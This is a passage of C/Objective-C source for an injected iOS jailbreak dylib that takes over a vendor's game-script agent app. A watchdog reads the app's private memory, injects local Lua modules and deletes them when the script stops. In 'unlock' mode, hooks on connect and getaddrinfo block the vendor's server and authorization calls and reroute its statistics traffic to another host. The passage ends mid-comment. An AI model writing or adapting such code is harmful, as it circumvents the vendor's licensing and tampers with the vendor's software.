#define US_STOP_FRESH 300   // ★ v6.24l：run 1->0 时 sjz 需在该秒数内还有写入才算「真的在跑」

// ★ v6.24l：文件 mtime 距今秒数（-1 = 文件不存在）
static long bs_file_age(const char *path) {
    struct stat sb;
    if (stat(path, &sb) != 0) return -1;
    long a = (long)(time(NULL) - (time_t)sb.st_mtime);
    return a < 0 ? 0 : a;
}

static void bs_us_mark_write(const char *why) {
    FILE *f = fopen(US_MARK, "w");
    if (!f) return;
    fprintf(f, "ts=%ld why=%s\n", (long)time(NULL), why ? why : "?");
    fclose(f);
}
static void bs_us_mark_clear(void) { unlink(US_MARK); }
static int bs_us_mark_exists(void) {
    struct stat sb;
    if (stat(US_MARK, &sb) != 0) return 0;
    // 7 天后自动失效（防极端情况下永久躺平：比如用户停脚本后中控再没下发过运行）
    if ((long)(time(NULL) - (time_t)sb.st_mtime) > 7 * 86400) { unlink(US_MARK); return 0; }
    return 1;
}

// ★ v6.24i：判断「最后一条事件是中控显式停脚本」——用于避免空闲兜底与人工停脚本打架。
//   中控停脚本会在 agent.log 留 "begin process operate script msg!"（★ v6.24k：
//   原写 "begin process stop script msg" 是错的 —— 设备实查该串 0 次、
//   operate 串 4 次，导致本函数恒返回 0，空闲兜底因此把用户停掉的脚本又拉起来）。
//   若停止标志出现在最后一次 "begin run script" 之后，说明是人工停的，不许自动拉。
static int bs_last_stop_is_user(const char *path, long want) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;
    char *lr = NULL, *ls = NULL, *q = buf;
    while ((q = strstr(q, "begin run script")) != NULL) { lr = q; ++q; }
    // ★ v6.24l：只用**精确的停止痕迹**。`begin process operate script msg` 虽然实测
    //   4 次全是停止，但它是中控「操作消息」的统一入口（运行同样走它），语义不可靠，
    //   一旦厂商改用它下发运行就会把「刚点运行」误判成「刚点停止」→ 闸门反锁。
    //   `agent stop script` 是厂商真正执行停止时必打的一行，最精确。
    q = buf;
    while ((q = strstr(q, "agent stop script")) != NULL) { ls = q; ++q; }
    q = buf;
    while ((q = strstr(q, "begin process stop script msg")) != NULL) {
        if (!ls || q > ls) ls = q;
        ++q;
    }
    free(buf);
    return (ls && (!lr || ls > lr)) ? 1 : 0;
}

// ★ v6.24e：最近一次 run 尝试是否以 run script error 收场 —— 返回「距该次 run 的秒数」，
//   无此类失败返回 -1。
//   判据：tail 内最后一次 "begin run script" 之后出现过 "run script error"（= 真的跑过
//   又炸了，且其后没有新的 run）。窗口必须放大（agent.log 的 server2 重连循环每 20s
//   就写 3 行，4KB 窗口几分钟就被挤满 —— 10-19 08:03 .216 首版实测漏判）。
//   同时用行首 "[YYYY/MM/DD HH:MM:SS]" 解析时刻，供调用方做过期判断。
static long bs_last_run_failed_age(const char *path, long want) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return -1; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return -1; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return -1; }
    buf[gn] = 0;
    long age = -1;
    char *last = NULL, *q = buf;
    while ((q = strstr(q, "begin run script")) != NULL) { last = q; ++q; }
    if (last && strstr(last, "run script error")) {
        char *ls = last;
        while (ls > buf && ls[-1] != '\n') --ls;
        if (*ls == '[') {
            struct tm tmv;
            memset(&tmv, 0, sizeof(tmv));
            tmv.tm_isdst = -1;
            if (strptime(ls + 1, "%Y/%m/%d %H:%M:%S", &tmv) != NULL) {
                time_t tt = mktime(&tmv);
                time_t nw = time(NULL);
                if (tt > 0) { age = (long)(nw - tt); if (age < 0) age = -1; }
            }
        }
        if (age < 0) age = 0;   // 时间戳解析失败时按「刚刚」处理（宁可救不误弃）
    }
    free(buf);
    return age;
}

static int bs_tail_count(const char *path, long want, const char *needle) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;
    int cnt = 0;
    const char *p = buf;
    while ((p = strstr(p, needle)) != NULL) { cnt++; p++; }
    free(buf);
    return cnt;
}

// ★ v6.24d：posix_spawn 薄封装 —— rootless 设备没有 /bin/sh，system() 必挂，
//   必须 posix_spawn + 显式绝对路径；sigdefault 全置 + mask 清空（继承标准语义）。
static void bs_spawnv(const char *path, char *const argv[]) {
    pid_t pid = -1;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    sigset_t all, none;
    sigfillset(&all);
    sigemptyset(&none);
    posix_spawnattr_setsigdefault(&attr, &all);
    posix_spawnattr_setsigmask(&attr, &none);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGDEF | POSIX_SPAWN_SETSIGMASK);
    int rc = posix_spawn(&pid, path, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    bs_log("[v624d] spawn %s rc=%d", path, rc);
}

// ★ v6.24d：冷启 App 重建「启动服务」会话 —— ★ v6.24p 已废弃（原为崩溃重试状态机
//   的升级动作，状态机已删）。函数体保留会导致 unused 警告，故整段移除。

static void *bs_watchdog(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    volatile uint64_t *stp  = (volatile uint64_t *)(base + OFF_STATE);
    volatile uint8_t  *runp = (volatile uint8_t  *)(base + OFF_RUN);
    uint64_t last_state = (uint64_t)-1;
    int stale = 0;
    // ★ v4.1：不再用 bool 锁死「只灌一次」。产品会在 _bb_init_script_player 里
    //   把整个 onion 字典**换新对象**（实测 str x0,[x9] 整体替换），换掉后旧判断
    //   永远不会重灌 → 后加的模块进不去。改为按「字典对象指针」变化重灌。
    void *last_dict = NULL;
    // ★ v6：记录上一轮脚本运行态，用于「脚本一停 → 立刻抹模块」
    uint8_t last_run = 0;
    int     saw_run  = 0;

    // ★ v6.7：自动重启状态机（相位 + 超时计数）—— ★ v6.24q 已随 [rl] 整体移除

    // ★ v6.17：func-nil 崩溃自动恢复（agent.log 增量扫描）—— v6.24p 起仅做证据与日志
    long   cr_size[2] = {-1, -1}; // ★ v6.23u [0]=agent.log [1]=sjz.log 上次尺寸（-1=首轮只记基线）
    time_t fg_last     = 0; // ★ v6.24d：上次 [fg] uiopen 游戏时刻（限速）
    time_t cr_stall_last = 0; // ★ v6.24p：上次停摆诊断扫描时刻
    int    us_latched = 0;    // ★ v6.24k：用户停止闸门在本进程内的缓存（配合 .bs_userstop）

    // ★ v6.24r：给运行库状态建基线（一次性，无状态文件时按盘上 beta.so 算 md5）
    bs_so_state_bootstrap();

    for (;;) {
        sleep(WD_TICK_SECS);

        uint64_t st  = *stp;
        uint8_t  run = *runp;

        // ★ v6.24k：用户停止闸门同步 —— run==1（中控下发「运行」）即解除。
        //   放在最前面：本拍后续所有自动拉起分支统一读 us_latched。
        if (run) {
            if (bs_us_mark_exists()) {
                bs_us_mark_clear();
                bs_evt("[us] run=1 -> user-stop gate cleared");
            }
            us_latched = 0;
        } else {
            us_latched = bs_us_mark_exists();
        }

        // ★ v6.24r：运行库生效确认 —— run=1 说明脚本真的起来了，此刻加载的
        //   就是盘上的 beta.so，pend 可以清 0。这是「落盘 ≠ 生效」唯一的收敛点：
        //   pend=1 期间远程就知道「还得再点一次运行」，不用靠猜。
        if (run && saw_run) {
            // 用 sjz.log 新鲜度排除「App 冷启后 run 标志残留为 1」的假运行（10-19 08:07 实锤）
            long sja = bs_file_age(DATA_DIR "/log/sjz.log");
            int pend = -1;
            char smd5[40] = {0};
            if (sja >= 0 && sja <= US_STOP_FRESH
                && bs_so_state_read(smd5, sizeof(smd5), NULL, &pend, NULL) && pend == 1) {
                bs_so_state_write(0, smd5, 0);
                bs_evt("[so] new so applied (script started, md5=%.8s) -> pend=0", smd5);
            }
        }

        // ---- ★ v6.24q：落盘后自动重启状态机已整体移除（用户指令：新 so 只落盘，
        //   脚本下次手动运行时自然加载；verwatch 按盘上版本预铺密钥，手动运行即可解）。

        // --- ★ v6：脚本 运行→停止 的那一刻，立刻抹掉本地模块 ---
        //     用户需求 #2：「脚本停止后，顺手把 bs_modules/*.lua 删除」。
        //     放在 watchdog 做（不是 puller），因为只有这里才能保证
        //     「不管脚本是被谁停的（中控点停 / 崩了 / 心跳杀的），都会清」。
        //     run 从 1 掉到 0 才触发；从未跑过（saw_run=0）不触发，避免启动即清空。
        if (run) { saw_run = 1; }
        // ★ v6.24k：run 1->0 = 脚本被停。默认按「用户主动停」处理，落盘闸门（.bs_userstop），
        //   禁止后续一切自动 OPER_START。若扫到崩溃签名，下面会撤销该闸门（崩溃优先）。
        //   排除：卡封禁下发的 STOP。（★ v6.24q：原 reload 自停排除条件随 [rl] 移除）
        if (!g_card_blocked && last_run == 1 && run == 0 && !us_latched) {
            // ★ v6.24l：必须确认「刚才真的在跑」才认定是用户停止。
            //   App 冷启时厂商 run 标志会残留为 1、初始化后掉 0（10-19 08:07 .216 实锤），
            //   那一下也构成 1->0，但 sjz.log 早已停摆 → 不是用户停止，不许落闸门（否则
            //   装完包/重启 App 后兜底永远不拉起，设备静默躺平）。
            long sa = bs_file_age(DATA_DIR "/log/sjz.log");
            if (sa >= 0 && sa <= US_STOP_FRESH) {
                bs_us_mark_write("run 1->0");
                us_latched = 1;
                bs_cr_mark_clear();          // 用户停了，旧的崩溃证据一并作废
                bs_evt("[us] script stop observed (run 1->0, sjz=%lds st=%p) -> auto-start gated until run=1",
                       sa, (void *)st);
            } else {
                bs_evt("[us] run 1->0 but sjz=%lds (>%ds) -> not a user stop, no gate",
                       sa, US_STOP_FRESH);
            }
        }
        // ★ v6.7：脚本停了就抹模块。（★ v6.24q：原 g_reload_busy 排除随 [rl] 移除）
        if (saw_run && last_run == 1 && run == 0 && st != 0) {
            bs_evt("[wd] script stopped (run 1->0) -> wipe modules");
            char dpath[288];
            snprintf(dpath, sizeof(dpath), "%s", g_mod_dir);
            int wiped = 0;
            DIR *d = opendir(dpath);
            if (d) {
                struct dirent *de;
                while ((de = readdir(d)) != NULL) {
                    size_t ln = strlen(de->d_name);
                    if (ln < 5) continue;
                    if (strcmp(de->d_name + ln - 4, ".lua") != 0) continue;
                    char fp[320];
                    snprintf(fp, sizeof(fp), "%s/%s", dpath, de->d_name);
                    if (unlink(fp) == 0) wiped++;
                }
                closedir(d);
            }
            bs_evt("[wd] wiped %d module file(s) after stop", wiped);
        }
        last_run = run;

        // --- ★ v6.17：func-nil 崩溃自动恢复（★ v6.23u 签名放宽 + 扩扫 sjz.log）---
        // 厂商胶水 wait_call_func 的 4~5h 模块自刷新有缺陷：重载拿回 nil 函数 →
        // `run script error: attempt to call local 'func' (a nil value)` → 自动停脚本。
        // 每轮对 agent.log / sjz.log 各做增量扫描：新增字节命中签名（带/不带引号两种
        // 格式都收）、脚本已停稳、心跳授权中、不在 reload 状态机里、过了冷却 →
        // 发 OPER_START 拉起（等价中控再点一次运行）。
        // 中控点停 / killswitch / 心跳失联等路径不含该签名，自然不会误拉。
        {
            const char *cr_paths[2] = { DATA_DIR "/log/agent.log",
                                        DATA_DIR "/log/sjz.log" };
            int cr_hit = 0, cr_src = -1;
            int cr_loadfail = 0;   // ★ v6.24c：本次命中是否属「加载期失败」类
            int cri;
            for (cri = 0; cri < 2; cri++) {
                struct stat ags;
                if (stat(cr_paths[cri], &ags) == 0) {
                    long sz = (long)ags.st_size;
                    if (cr_size[cri] < 0 || sz < cr_size[cri]) {
                        // 首轮只记基线；日志被截断/轮转时重置基线且本轮不扫描（防旧签名误触发）
                        cr_size[cri] = sz;
                    } else if (sz > cr_size[cri]) {
                        long add = sz - cr_size[cri];
                        if (add > 262144) add = 262144;   // 异常暴增只看尾部 256K
                        long off = sz - add;
                        char *buf = (char *)malloc((size_t)add + 1);
                        if (buf) {
                            int fd = open(cr_paths[cri], O_RDONLY);
                            if (fd >= 0) {
                                lseek(fd, off, SEEK_SET);
                                ssize_t gn = read(fd, buf, (size_t)add);
                                close(fd);
                                if (gn > 0) {
                                    buf[gn] = 0;
                                    // ★ v6.23z：签名放宽 —— func-nil 两种格式之外，
                                    //   任意 "run script error:"（Agent 对脚本层错误的
                                    //   统一报错行）都视为脚本停摆信号。厂商行为是
                                    //   报错即自动停脚本，故命中即具备重拉前提；
                                    //   非致命误报由 CR_COOLDOWN + run/st 条件兜住。
                                    if (strstr(buf, "attempt to call local 'func' (a nil value)") ||
                                        strstr(buf, "attempt to call local func (a nil value)") ||
                                        strstr(buf, "run script error:")) {
                                        cr_hit = 1;
                                        cr_src = cri;
                                    }
                                    // ★ v6.24c：加载期失败 —— 缺版本密钥 / snail 模块加载失败。
                                    //   实测（10-17 .115）：beta.so 有 9 个段版本，dylib 启动
                                    //   先只铺到 2 把，中控 4s 后下发 run → 18s 加载失败；
                                    //   其余 7 把 19.7s 才补齐。这类失败**键补齐后重试必成**，
                                    //   因此同样视为停摆信号并交给重试状态机（不再干等人点）。
                                    if (strstr(buf, "can not find version key") ||
                                        strstr(buf, "load snail module failed")) {
                                        cr_hit = 1;
                                        cr_src = cri;
                                        cr_loadfail = 1;
                                    }
                                }
                            }
                            free(buf);
                        }
                    }
                    cr_size[cri] = sz;
                } else {
                    cr_size[cri] = -1;   // 文件暂时读不到（轮转瞬间），下轮重置基线
                }
                if (cr_hit) break;
            }
            if (cr_hit) {
                time_t nowt = time(NULL);
                // ★ v6.24h：先把证据落盘（App 重启会清空 agent.log，marker 不会）
                if (run == 0) bs_cr_mark_write(cr_src == 0 ? "agent" : "sjz");
                // ★ v6.24p：自动恢复已整体移除（用户指令：除「脚本本来在跑」与
                //   「中控手动下发运行」外一律不自动运行脚本）。崩溃只留证据与节流日志，
                //   原地停住，等人点「运行」。
                static time_t ar_log = 0;
                if (nowt - ar_log >= 60) {
                    ar_log = nowt;
                    bs_evt("[cr] ★ crash detected (%s%s) -> auto-start REMOVED v6.24p: "
                           "kept STOPPED, press Run in center to resume",
                           cr_src == 0 ? "agent.log" : "sjz.log",
                           cr_loadfail ? " loadfail" : "");
                }
            }
        }

        // --- ★ v6.24e：停摆兜底扫描（不依赖日志增量）---
        //   cr_pending 只在「本轮扫到新签名行」时置位；而 dylib 进程一旦重启，
        //   cr_size 基线重置 → 崩溃签名永远扫不到 → 静默停摆（10-19 07:57 .216：
        //   冷启 App 后 dylib 换了新进程，07:55 的 run-error 行再也没被读到时即如此）。
        //   这里每 CR_STALL_SCAN 秒复核 agent.log 尾部：最近一次 begin run script
        //   之后是 run script error（= run 真跑过又炸了，且其后没有成功的 run），
        //   判据用 **st==0**（脚本容器不存在）而不是 run==0 —— 10-19 08:07 .216 实测：
        //   App 冷启后厂商 run 标志仍滞留为 1（日志里 run=1 但 agent 早已 stop script、
        //   sjz 停摆 12 分钟），拿 run==0 当闸门会把这种情况永久挡住。st!=0 时脚本容器
        //   确实活着，绝不搅局；用户主动停脚本又不会留下 run-error 行，故不会误拉。
        if (g_mode == MODE_UNLOCK && !g_card_blocked) {
            time_t nowt4 = time(NULL);
            if (run) bs_cr_mark_clear();      // 跑起来了 = 已恢复，顺手清证据
            if (nowt4 - cr_stall_last >= CR_STALL_SCAN) {
                cr_stall_last = nowt4;
                char ap[300];
                snprintf(ap, sizeof(ap), "%s/log/agent.log", DATA_DIR);
                long rage = bs_last_run_failed_age(ap, 65536);
                long mage = bs_cr_mark_age();
                if (mage > 86400) { bs_cr_mark_clear(); mage = -1; }   // 过期证据不作数
                // ★ v6.24p：停摆/空闲兜底的自动 OPER_START 已删除（用户指令：脚本停了
                //   就是停了，只等人点「运行」）。本扫描仅保留两件事：
                //   ① 用户停止证据清理；② 5 分钟一条诊断快照（纯观察，远程定位卡点用）。
                long sjz_age = -1;
                char sp[300];
                snprintf(sp, sizeof(sp), "%s/log/sjz.log", DATA_DIR);
                struct stat ssb;
                if (stat(sp, &ssb) == 0) sjz_age = (long)(nowt4 - (time_t)ssb.st_mtime);
                // ★ v6.24k：用户停止判定（us_latched 或 agent.log 显式停止痕迹）。
                int us_stop = us_latched || bs_last_stop_is_user(ap, 262144);
                if (us_stop) {
                    // 用户停的：把残留崩溃证据也作废，避免误导后续诊断
                    if (mage >= 0) bs_cr_mark_clear();
                    mage = -1;
                }
                // 每 5 分钟一条诊断快照（不动作），便于下次远程定位卡点
                static time_t stlog = 0;
                if (nowt4 - stlog >= 300) {
                    stlog = nowt4;
                    // ★ v6.24r：带上运行库生效状态。so=盘上 md5 前 8 位，pend=1 表示
                    //   「盘上新的、内存旧的，还差一次手动运行」。这样远程一眼分得清
                    //   三种停摆：盘上旧的坏包 / 盘上新包但没重启脚本 / 新包已生效还停。
                    char smd5[40] = {0};
                    long ssz = -1, sap = 0;
                    int  spend = -1;
                    if (!bs_so_state_read(smd5, sizeof(smd5), &ssz, &spend, &sap))
                        snprintf(smd5, sizeof(smd5), "unknown");
                    bs_evt("[cr] stall scan: run=%u st=%p hb=%d rage=%ld mark=%ld sjz=%ld us=%d "
                           "so=%.8s pend=%d size=%ld",
                           (unsigned)run, (void *)st, g_hb_ok, rage, mage, sjz_age, us_stop,
                           smd5, spend, ssz);
                }
            }
        }

        // --- ★ v6.24b：崩溃恢复重试状态机 —— ★ v6.24p 已整块删除 ---
        //   （自动 OPER_START / 递增重试 / 会话死升级冷启 App 全部移除。
        //     用户指令：脚本运行只认「本来在跑」与「中控手动下发」，其余不自动。）

        // --- ★ v6.24d：[fg] 游戏前台看门狗 ---
        //   脚本活着（run=1）但游戏被顶到后台：sjz.log 停摆 ≥ FG_STALE_SECS
        //   且尾部最后留下的是 "game is not front app"（10-18 .216 实锤断流形态）。
        //   双条件缺一不可 —— 只看 sjz 停摆就是 v6.23z 被否的静默看门狗（休眠误判），
        //   必须同时命中前台签名才动作。uiopen 游戏拉回前台，FG_MIN 限速。
        //   probe 模式（真卡机）零动作。
        if (g_mode == MODE_UNLOCK && run && saw_run) {
            time_t nowt3 = time(NULL);
            if (nowt3 - fg_last >= FG_MIN) {
                char sp[300];
                snprintf(sp, sizeof(sp), "%s/log/sjz.log", DATA_DIR);
                struct stat sb2;
                if (stat(sp, &sb2) == 0
                    && nowt3 - (time_t)sb2.st_mtime >= FG_STALE_SECS
                    && bs_tail_count(sp, 1024, "game is not front app") > 0) {
                    fg_last = nowt3;
                    bs_log("[fg] sjz stale %ds + game-not-front signature -> uiopen %s",
                           (int)(nowt3 - (time_t)sb2.st_mtime), FG_GAME_BID);
                    char *uo[] = { (char *)"/usr/bin/uiopen", (char *)"--bundleid",
                                   (char *)FG_GAME_BID, NULL };
                    bs_spawnv("/usr/bin/uiopen", uo);
                }
            }
        }

        // --- v5.4：puller 拉到新模块后只置位，实际注入在这里做 ---
        //     puller 是裸 pthread，而 bs_inject_modules 要调 Agent 内部函数、
        //     造 NSString/NSData、写 NSMutableDictionary —— 这些都必须躲开
        //     puller 线程（凡是会在裸线程上触发 runtime 懒加载的都得小心）。
        //     watchdog 线程虽然也是裸 pthread，但它在 state 就绪后(下面分支)
        //     才注入，此刻 runtime 早已被产品自己初始化完毕，实测安全。
        if (g_need_inject) {
            g_need_inject = 0;
            if (g_card_blocked) {
                // ★ v6.20：卡密封禁 → 拒绝注入（[card] BLOCKED 已打日志）
                bs_log("[wd] need_inject skipped (card blocked)");
            } else {
            bs_log("[wd] need_inject set -> inject now (st=%p)", (void *)st);
            if (st != 0) {
                bs_inject_modules(base);
                bs_log("[wd] need_inject done");
            } else {
                bs_log("[wd] need_inject but st==0, defer");
                g_need_inject = 1;      // 还没到能注入的时机，留给下一轮
            }
            }
        }

        // --- v4.1：state 出现 且 字典对象换过 → 重灌本地模块 ---
        if (st != 0) {
            void *dict = *(void **)(base + OFF_ONION_DICT);
            if (dict != last_dict || st != last_state) {
                bs_log("[wd] state change st=%p dict=%p -> inject", (void *)st, dict);
                last_state = st;
                last_dict  = dict;
                if (g_card_blocked) {
                    // ★ v6.20：卡密封禁 → 拒绝重灌模块
                    bs_log("[wd] inject skipped (card blocked)");
                } else {
                    bs_inject_modules(base);
                    bs_log("[wd] inject returned");
                }
                continue;               // 本轮不参与僵死判定
            }
        } else {
            last_state = (uint64_t)-1;
            last_dict  = NULL;
        }

        // --- v3：僵死态自愈 ---
        // ★ v6.7：重启期间跳过僵死判定 —— ★ v6.24q：原 g_reload_busy 跳过随 [rl] 移除

        if (st == 0 || run != 0) {  // 正常态：无 state 或脚本正在跑
            stale = 0;
            continue;
        }

        if (++stale < WD_STALE_TICKS) continue;
        stale = 0;

        int rs = *(volatile int *)(base + OFF_RS_1A8);
        bs_evt("[wd] stale state=%p run=%u rs=%d -> request STOP",
               (void *)st, (unsigned)run, rs);

        ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);

        sleep(4);
        uint64_t after = *stp;
        if (after == 0) {
            bs_log("[wd] stale state cleared OK");
        } else {
            bs_log("[wd] state still %p after stop request", (void *)after);
        }
    }
    return NULL;
}

// ---------------------------------------------------------------- 主流程
// ================================================================
// ★★★ v6.19：厂商服务器进程内屏蔽（fishhook，仅 unlock 模式）
// ================================================================

static int (*g_orig_connect)(int, const struct sockaddr *, socklen_t);
static int (*g_orig_getaddrinfo)(const char *, const char *,
                                 const struct addrinfo *, struct addrinfo **);
// ★ v6.21：运行时闸门 —— __interpose 节由 dyld 装载时无条件生效，probe
//（真卡机）/ blockvps=0 必须全放行，故屏蔽逻辑以 g_blk_active 为准。
static volatile int g_blk_active = 0;

/// 解析真身：fishhook 填过就用；否则 RTLD_NEXT 跳过本镜像取 libsystem 真身。
/// （不能 RTLD_DEFAULT —— interpose 生效时会解析到替身自身 → 无限递归。）
static void *bs_orig_fn(const char *name, void **slot) {
    if (*slot) return *slot;
    void *p = dlsym(RTLD_NEXT, name);
    if (p) *slot = p;
    return p;
}

/// connect 替身：目标 = 厂商 IP（43.154.19.236）→ EHOSTUNREACH。
/// 其余连接（我们云端 / 中控 PC / 60.204 / relay）全部原样放行。
static int bs_hook_connect(int fd, const struct sockaddr *addr, socklen_t len) {
    (void)len;
    if (!bs_orig_fn("connect", (void **)&g_orig_connect))
        { errno = ENOSYS; return -1; }
    // ★ v6.23l/v6.23m：统计上报改道 —— 只命中厂商统计 IP:7875/7880，其它连接零感知。
    //   目标解析：① conf statip= 优先；② 未配置 → 现读 app.plist 中控 ip
    //   （用户拍板：中控与统计网站都是 app.plist 那台电脑，端口不变）。
    //   放在 g_blk_active 闸门之前：probe（真卡机）同样生效。
    if (addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_stat_vp_net) {
            int port = (int)ntohs(a.sin_port);
            if (port == 7875 || port == 7880) {
                uint32_t net = g_stat_ip_net;      // ① conf statip=
                const char *dst = g_stat_ip;
                const char *src = "conf";
                char appip[64]; appip[0] = 0;
                if (!net) {                        // ② v6.23m：现读 app.plist
                    bs_pc_ip_of_plist(appip, sizeof(appip));
                    if (appip[0]) {
                        uint32_t n2 = inet_addr(appip);
                        if (n2 != INADDR_NONE && n2 != 0) {
                            net = n2; dst = appip; src = "app.plist";
                        }
                    }
                }
                if (net) {
                    a.sin_addr.s_addr = net;
                    long n = ++g_stat_n_redir;
                    if (n <= 5 || n % 60 == 1)
                        bs_log("[stat] connect " STAT_VENDOR_IP ":%d -> %s (%s) (#%ld)",
                               port, dst, src, n);
                    return g_orig_connect(fd, (struct sockaddr *)&a, sizeof(a));
                }
                // ①② 均无有效目标 → 原样放行（历史行为，落厂商）
            }
        }
    }
    if (!g_blk_active)
        return g_orig_connect(fd, addr, len);
    if (addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_vps_ip_net) {
            long n = ++g_blk_n_connect;
            if (n <= 5 || n % 60 == 1)
                bs_log("[blk] connect " VPS_IP_STR ":%d blocked (#%ld)",
                       (int)ntohs(a.sin_port), n);
            errno = EHOSTUNREACH;
            return -1;
        }
    }
    return g_orig_connect(fd, addr, len);
}

/// getaddrinfo 替身：解析 vps.beibeiplay.com → EAI_NONAME（TCP/UDP 全掐在源头）。
static int bs_hook_getaddrinfo(const char *node, const char *service,
                               const struct addrinfo *hints, struct addrinfo **res) {
    if (!bs_orig_fn("getaddrinfo", (void **)&g_orig_getaddrinfo))
        return EAI_SYSTEM;
    if (!g_blk_active)
        return g_orig_getaddrinfo(node, service, hints, res);
    if (node && !strcmp(node, VPS_DOMAIN)) {
        long n = ++g_blk_n_dns;
        if (n <= 5 || n % 60 == 1)
            bs_log("[blk] getaddrinfo " VPS_DOMAIN " blocked (#%ld)", n);
        return EAI_NONAME;
    }
    return g_orig_getaddrinfo(node, service, hints, res);
}

static void bs_install_net_block(void) {
    if (g_blk_installed) return;
    g_vps_ip_net = inet_addr(VPS_IP_STR);
    struct rebinding rbs[2] = {
        { "connect",     (void *)bs_hook_connect,     (void **)&g_orig_connect     },
        { "getaddrinfo", (void *)bs_hook_getaddrinfo, (void **)&g_orig_getaddrinfo },
    };
    int rc = rebind_symbols(rbs, 2);
    g_blk_installed = 1;
    g_blk_active = 1;   // ★ v6.21：interpose 在装载时已生效，此处只开闸门
    bs_log("[blk] net block installed rc=%d fish=%d/%d interpose=on (" VPS_DOMAIN
           " / " VPS_IP_STR ", unlock only)",
           rc, g_orig_connect ? 1 : 0, g_orig_getaddrinfo ? 1 : 0);
}

// ★ v6.21：dyld interpose —— fishhook 只能重绑**调用方镜像**的 GOT，实测
//   _bb_run_auth 的 connect 走共享缓存内部调用（[blk] 计数恒 0）拦不住。
//   __DATA,__interpose 对全进程所有经 dyld 桩的调用点生效（含 CFNetwork），
//   与 fishhook 并存无冲突（同一替身，orig 各自解析）。
#define BS_INTERPOSE(replacement, replacee)                                   \
    __attribute__((used)) static struct {                                     \
        const void *replacement;                                              \
        const void *replacee;                                                 \
    } bs_interpose_##replacee                                                 \
    __attribute__((section("__DATA,__interpose"))) = {                        \
        (const void *)(unsigned long)&replacement,                            \
        (const void *)(unsigned long)&replacee,                               \
    }

BS_INTERPOSE(bs_hook_connect, connect);
BS_INTERPOSE(bs_hook_getaddrinfo, getaddrinfo);

/// ★ v6.19：constructor 立即起的安装线程 —— 赶在 Agent 首次外联之前。
///   不等 bootstrap 的 2s sleep：自己快扫 conf 的 mode=/blockvps=（毫秒级纯 C）。
///   probe（真卡机）永不装钩子 —— 卡密心跳必须活着。
// ══════════ ★ v6.23v App 进程：安装后首启自动点「启动服务」 ══════════
// 只在 App 本体进程跑（filter 扩到 App 后 ElleKit 会把本 dylib 也注入 App）。

// 判当前进程是不是 App 本体（可执行名 = BetaScreenTYMDESUJCX8T；Agent 名多一个 "Agent"）
static int bs_proc_is_app(void) {
    char path[1024];
    uint32_t sz = sizeof(path);
    if (_NSGetExecutablePath(path, &sz) != 0) return 0;
    const char *bn = strrchr(path, '/');
    bn = bn ? bn + 1 : path;
    return strcmp(bn, "BetaScreenTYMDESUJCX8T") == 0;
}

// 「装后自动点服务」标记：postinst 写（内容=deb 版本号），点成功后改名消费
static int bs_autosvc_pending(char *ver, size_t vsz) {
    char path[300];
    snprintf(path, sizeof(path), DATA_DIR "/.autosvc_pending");
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (ver && vsz) {
        ver[0] = 0;
        if (fgets(ver, (int)vsz, f)) {
            size_t n = strlen(ver);
            while (n && (ver[n-1] == '\n' || ver[n-1] == '\r' || ver[n-1] == ' ')) ver[--n] = 0;
        }
    }
    fclose(f);
    return 1;
}

// UI 属性协议 —— 只声明用到的选择器，保证 objc_msgSend 的返回值寄存器约定正确
// （CGFloat/double 走 v 寄存器，裸 id 消息会读错寄存器，必须经协议声明）
@protocol BSAutoUI <NSObject>
@optional
- (NSArray *)windows;
- (NSArray *)subviews;
- (BOOL)isHidden;
- (CGFloat)alpha;
- (NSString *)currentTitle;
- (NSString *)accessibilityLabel;
- (void)sendActionsForControlEvents:(NSUInteger)events;
- (id)rootViewController;
- (BOOL)isKeyWindow;
- (id)presentedViewController;
- (NSString *)text;
- (BOOL)isOn;
- (void)setOn:(BOOL)on animated:(BOOL)animated;
@end

@interface BSAutosvcHelper : NSObject
+ (void)as_kickoff;
- (void)as_setup;
- (void)as_tick:(id)timer;
- (BOOL)as_tryTap;
- (void)as_active:(id)note;
- (BOOL)as_scanViews:(id)views;
- (void)as_dump:(id)views depth:(int)d;
@end

static int             g_as_tries  = 0;
static int             g_as_dumpln = 0;
static int             g_as_busy   = 0;   // ★ v6.24j：点击流程进行中，避免重复 kickoff
static BSAutosvcHelper *g_as_helper = nil;

@implementation BSAutosvcHelper

// 递归扫 UIWindow 树。命中规则（.47 UI dump 实锤：启动服务 = UILabel+UISwitch 开关）：
//   ① 首选 —— 同容器内存在 text 含「启动服务」的 UILabel 且存在 UISwitch → 拨开关：
//      setOn:YES + sendActionsForControlEvents:UIControlEventValueChanged(4096)，
